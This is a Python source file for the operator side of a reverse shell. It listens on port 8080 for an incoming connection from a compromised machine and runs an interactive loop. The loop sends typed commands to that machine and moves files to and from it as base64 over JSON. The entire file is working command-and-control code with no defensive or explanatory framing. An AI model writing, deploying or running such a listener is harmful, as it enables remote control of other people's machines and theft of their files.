import socket
import json
import base64

class SocketListener:
    def __init__(self, ip, port):
        self.my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.my_listener.bind((ip, port))
        self.my_listener.listen(0)
        print("Listening...")
        self.my_connection, my_address = self.my_listener.accept()
        print("Connection OK from " + str(my_address))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode())

    def json_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit()

        return self.json_receive()

    def save_file(self, path, content):
        with open(path, "wb") as dw_file:
            dw_file.write(base64.b64decode(content))
            return "Download OK!"

    def get_content(self, path):
        with open(path, "rb") as dw_file:
            return base64.b64encode(dw_file.read()).decode()

    def start_listener(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    file_content = self.get_content(command_input[1])
                    command_input.append(file_content)
                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1], command_output)
            except Exception:
                command_output = "Error!"
            print(command_output)


my_socket_listener = SocketListener("ip", 8080)
my_socket_listener.start_listener()
